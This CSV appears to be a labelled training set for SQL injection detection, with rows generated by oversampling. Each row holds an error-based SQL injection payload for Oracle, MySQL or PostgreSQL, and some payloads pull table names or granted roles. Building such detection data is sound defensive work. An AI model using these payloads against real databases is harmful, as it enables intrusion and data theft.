id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000393,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000060,0.9096133184566209
SMOTE_000394,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,1.2186062340443566
SMOTE_000395,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000056,0.8162966147145801
SMOTE_000396,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,1.8287913085598582
SMOTE_000397,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000022,0.42665623371584316
SMOTE_000398,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,1.1768357803367229
SMOTE_000399,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,0.8942098221844862
SMOTE_000400,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.6858739404357614e-07
SMOTE_000401,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000075,2.6538570341514136
SMOTE_000402,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000036,0.9211744921231355
SMOTE_000403,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,1.6750077011522118
SMOTE_000404,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000024,0.6984192888871533
SMOTE_000405,attack,error,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000021,0.5954992962207827
SMOTE_000406,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000034,1.9415335740104616
SMOTE_000407,attack,error,"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",nearest_attack_euclidean,R000051,1.372025620220088
SMOTE_000408,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000025,0.9789063894398987
SMOTE_000409,attack,error,"1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510",nearest_attack_euclidean,R000015,0.14795781279309217
SMOTE_000410,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000012,0.42469628804239573
SMOTE_000411,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.6858739404357614e-07
SMOTE_000412,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,0.05194284671102035
SMOTE_000413,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000043,1.0650060349091321
SMOTE_000414,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,0.06729818634711889
SMOTE_000415,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000008,0.7567977680839341
SMOTE_000416,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000059,0.11806976351604431
SMOTE_000417,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000059,1.8743256631182352
SMOTE_000418,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.45182284094291075
SMOTE_000419,attack,error,"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000023,0.5610049766634205
SMOTE_000420,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000076,2.5686125160157247
SMOTE_000421,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000056,1.2048767631274173
SMOTE_000422,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000077,0.10676428995147925
SMOTE_000423,attack,error,"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000030,0.6878332507100577
SMOTE_000424,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000019,0.7404643775810555
SMOTE_000425,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000057,1.4582619616939223
SMOTE_000426,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000057,0.3274311725544845
SMOTE_000427,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000060,1.324948692209121
SMOTE_000428,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000011,1.3392502430461146
SMOTE_000429,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000041,0.3721408630140497
SMOTE_000430,attack,error,-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,nearest_attack_euclidean,R000017,1.1018799749794028
SMOTE_000431,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,1.0416645127461504
SMOTE_000432,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000059,1.282636695514959
SMOTE_000433,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000013,0.04709449076488716
SMOTE_000434,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000039,0.9216512361207897
SMOTE_000435,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000043,1.0383168136876073
SMOTE_000436,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,0.6297347562902375
SMOTE_000437,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000012,0.44945859134378097
SMOTE_000438,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000043,0.049576295458775406
SMOTE_000439,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000018,0.2431658482617005
SMOTE_000440,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000008,0.009210338741740562
SMOTE_000441,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000062,1.3900036029331624
SMOTE_000442,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000025,0.13847776605354
SMOTE_000443,attack,error,"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000020,0.4956944348026701
SMOTE_000444,attack,error,"1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510",nearest_attack_euclidean,R000015,0.3487549808129884
SMOTE_000445,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,0.558085710881725
SMOTE_000446,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,0.3854173452208543
SMOTE_000447,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",nearest_attack_euclidean,R000009,1.1469152180498388
SMOTE_000448,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",nearest_attack_euclidean,R000009,0.5095029144460106
SMOTE_000449,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000075,2.6804238408198064
SMOTE_000450,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R000063,0.6390212990615722
SMOTE_000451,attack,error,"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000052,2.0988510047954305
SMOTE_000452,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,2.0994623495203797
SMOTE_000453,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000003,0.3039832239773887
SMOTE_000454,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000013,0.2127157872498789
SMOTE_000455,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000067,0.31041529623363484
SMOTE_000456,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000019,0.24977374378865627
SMOTE_000457,attack,error,-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,nearest_attack_euclidean,R000016,0.6088247680633428
SMOTE_000458,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000068,1.0877054038208365
SMOTE_000459,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000062,1.2217090558955779
SMOTE_000460,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,0.17362170130971266
SMOTE_000461,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000058,1.3262840120168509
SMOTE_000462,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000003,2.9200193199910854e-07
SMOTE_000463,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000046,0.13702203817099165
SMOTE_000464,attack,error,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000073,1.820738121301759
SMOTE_000465,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000008,1.4082293409032611
SMOTE_000466,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000003,1.0675603385925503
SMOTE_000467,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000019,0.2565898467030333
SMOTE_000468,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000026,1.196929841137998
